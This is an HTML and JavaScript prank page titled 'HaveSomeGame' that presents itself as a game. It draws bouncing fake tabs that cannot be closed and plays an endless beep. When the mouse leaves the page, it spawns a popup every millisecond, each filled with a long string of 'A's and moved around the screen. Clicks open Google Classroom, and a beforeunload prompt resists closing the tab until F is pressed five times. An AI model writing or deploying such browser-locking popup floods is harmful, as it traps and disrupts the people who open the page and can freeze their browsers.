<!DOCTYPE html>
<html>
<head>
  <title>HaveSomeGame</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }
    @keyframes blink {
      from { color: white; }
      to { color: red; }
    }
    .fakeTab {
      position: absolute;
      background: #2d2d2d;
      border-radius: 8px 8px 0 0;
      box-shadow: 0 0 10px rgba(255,255,255,0.5);
      color: white;
      font-family: Arial, sans-serif;
      overflow: hidden;
      cursor: pointer;
    }
    .tabHeader {
      background: #3c3c3c;
      height: 28px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 8px;
      font-size: 14px;
    }
    .tabHeader .close {
      font-weight: bold;
      color: #ccc;
      cursor: pointer;
    }
    .tabContent {
      text-align: center;
      padding-top: 20px;
      font-size: 1.2em;
      animation: blink 0.5s infinite alternate;
    }
    .confetti {
      position: fixed;
      width: 8px;
      height: 8px;
      background: red;
      animation: fall 2s linear forwards;
    }
    @keyframes fall {
      to {
        transform: translateY(100vh) rotate(360deg);
        opacity: 0;
      }
    }
  </style>
</head>
<body>
  <audio autoplay loop>
    <source src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Beep-sound.ogg" type="audio/ogg">
  </audio>

  <script>
    const tabs = [];
    let remainingTabs = 5;
    let searchInterval = null;
    let fPressCount = 0;
    let unlocked = false;

    function makeTab(index) {
      const tab = document.createElement("div");
      tab.className = "fakeTab";

      const width = Math.floor(Math.random() * 200) + 200;
      const height = Math.floor(Math.random() * 100) + 100;
      tab.style.width = width + "px";
      tab.style.height = height + "px";

      let x = Math.floor(Math.random() * (window.innerWidth - width));
      let y = Math.floor(Math.random() * (window.innerHeight - height));

      let dx = (Math.random() * 2 + 1) * (Math.random() < 0.5 ? -1 : 1);
      let dy = (Math.random() * 2 + 1) * (Math.random() < 0.5 ? -1 : 1);

      tab.style.left = x + "px";
      tab.style.top = y + "px";

      const header = document.createElement("div");
      header.className = "tabHeader";
      header.innerHTML = `<span>Tab ${index+1}</span><span class="close">âœ•</span>`;
      tab.appendChild(header);

      const content = document.createElement("div");
      content.className = "tabContent";
      content.textContent = "Close me for $5";
      tab.appendChild(content);

      document.body.appendChild(tab);

      // Initially nonclosable
      header.querySelector(".close").onclick = () => {
        if (unlocked) {
          tab.remove();
          showConfetti();
        } else {
          window.open("https://classroom.google.com", "_blank");
        }
      };

      function animate() {
        if (!document.body.contains(tab)) return;
        if (x + width >= window.innerWidth || x <= 0) dx = -dx;
        if (y + height >= window.innerHeight || y <= 0) dy = -dy;
        x += dx;
        y += dy;
        tab.style.left = Math.round(x) + "px";
        tab.style.top = Math.round(y) + "px";
        requestAnimationFrame(animate);
      }
      animate();

      tabs.push(tab);
    }

    for (let i = 0; i < 5; i++) {
      makeTab(i);
    }

    // Popup spam on mouseleave
    document.addEventListener("mouseleave", () => {
      if (remainingTabs > 0 && !searchInterval && !unlocked) {
        searchInterval = setInterval(() => {
          const width = Math.floor(Math.random() * 300) + 200;
          const height = Math.floor(Math.random() * 200) + 150;
          let x = Math.floor(Math.random() * (screen.availWidth - width));
          let y = Math.floor(Math.random() * (screen.availHeight - height));

          let dx = (Math.random() * 10 + 5) * (Math.random() < 0.5 ? -1 : 1);
          let dy = (Math.random() * 10 + 5) * (Math.random() < 0.5 ? -1 : 1);

          const popup = window.open("about:blank", "",
            `width=${width},height=${height},left=${x},top=${y}`);

          if (popup && popup.document) {
            popup.document.write(`
              <body style="margin:0;background:black;color:white;
                           font-family:Arial;text-align:center;">
                <p>${"A".repeat(10000)}</p>
              </body>
            `);
          }

          const interval = setInterval(() => {
            if (!popup || popup.closed) {
              clearInterval(interval);
              return;
            }
            if (x + width >= screen.availWidth || x <= 0) dx = -dx;
            if (y + height >= screen.availHeight || y <= 0) dy = -dy;
            x += dx;
            y += dy;
            popup.moveTo(Math.round(x), Math.round(y));
            popup.resizeTo(width, height);
          }, 16);
        }, 1);
      }
    });

    document.addEventListener("mouseenter", () => {
      if (searchInterval) {
        clearInterval(searchInterval);
        searchInterval = null;
      }
    });

    // Clicking anywhere opens Google Classroom (before unlock)
    document.addEventListener("click", () => {
      if (!unlocked) {
        window.open("https://classroom.google.com", "_blank");
      }
    });

    // Unlock sequence: press F 5 times consecutively
    document.addEventListener("keydown", (e) => {
      if (e.key.toLowerCase() === "f") {
        fPressCount++;
        if (fPressCount >= 5) {
          unlocked = true;
          fPressCount = 0;
          if (searchInterval) {
            clearInterval(searchInterval);
            searchInterval = null;
          }
        }
      } else {
        fPressCount = 0; // reset if any other key pressed
      }
    });

    // Confetti effect
    function showConfetti() {
      for (let i = 0; i < 30; i++) {
        const confetti = document.createElement("div");
        confetti.className = "confetti";
        confetti.style.left = Math.random() * window.innerWidth + "px";
        confetti.style.top = "-10px";
        confetti.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
        document.body.appendChild(confetti);
        setTimeout(() => confetti.remove(), 2000);
      }
    }

    // Confirmation before closing main tab
    window.addEventListener("beforeunload", function (e) {
      e.preventDefault();
      e.returnValue = "Are you sure you want to close this tab?";
    });
  </script>
</body>
</html>
